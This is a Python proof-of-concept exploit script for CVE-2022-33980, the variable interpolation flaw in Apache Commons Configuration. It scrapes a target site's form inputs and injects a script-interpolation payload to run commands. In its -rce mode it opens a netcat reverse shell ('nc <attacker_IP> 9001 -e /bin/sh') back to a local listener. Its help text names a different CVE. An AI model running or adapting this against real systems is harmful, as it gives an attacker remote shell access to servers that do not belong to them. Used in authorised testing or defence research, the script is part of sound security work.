#! /usr/bin/python3
# CVE-2022-33980
# Apache Commons Configuration Library Vulnerability
# version : 2.4~2.7
# version(reg) : ^2\.[4-7]$

import argparse
import subprocess
import requests
import urllib
import time
from bs4 import BeautifulSoup
import socket, sys, time
from threading import Thread
import base64
import os

print('''=====================================================\n                    CVE-2022-33980\n  Apache Commons Configuration Library Vulnerability\n=====================================================''')


parser = argparse.ArgumentParser(usage="python3 poc.py -u <Target URL> -f <Target file> ")
parser = argparse.ArgumentParser(description="python3 CVE-2022-42889.py -u http://172.22.111.12:8080 -rce")
parser.add_argument('-u','--URL', required=True ,help='Target server IP')
parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
args = parser.parse_args()


def find_input_form(URL):
    response = requests.get(URL)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    
    generated_urls = []
    
    for form in forms:

        form_action = form.get("action", "")
        inputs = form.find_all('input')

        for input_tag in inputs:
            input_name = input_tag.get("name")
            
            if input_name:
                full_url = f"{form_action}?{input_name}=" # "action?name=" 형식의 URL 생성
                generated_urls.append(URL+full_url)
                print(f"[+] Find target PATH : {full_url}")

    return generated_urls


def nc_listener():
    os.system("nc -lnvp 9001")

# Get attacker IP
def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP = Get_My_IP()


def Detected_Vulnerability(PATHS):

    for PATH in PATHS:
        payload = f'''${{script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/RCE')}}'''
        payload = urllib.parse.quote(payload)

        url = f"{PATH}{payload}"

        print(f"[+] Payload : {url} ")

        response = requests.get(url)
        time.sleep(1)

        if response.status_code == 200:
            print(f"[*] Detected Vulnerability : True")
            print("------------------------------------")
            return True
        else:
            print(f"[-] Detected Vulnerability : False")
            return False


def exploit(PATHS):

    listener_thread = Thread(target=nc_listener)
    listener_thread.start()
    time.sleep(1)

    for PATH in PATHS:
        #PoC
        payload = f'''${{script:javascript:java.lang.Runtime.getRuntime().exec("nc {attacker_IP} 9001 -e /bin/sh")}}'''
        payload = urllib.parse.quote(payload)
        url = f"{PATH}{payload}"

        # print(f"[+] Create Payload : {url} ")

        response = requests.get(url)
        

if __name__ == "__main__":

    URL=args.URL.rstrip("/")

    print(f"[+] Target URL: {URL}")
    PATHS=find_input_form(URL)

    print(PATHS)

    if Detected_Vulnerability(PATHS):
        if args.RCE:
            exploit(PATHS)     
            pass
        else:
            print("To execute an RCE, add the -rce option.")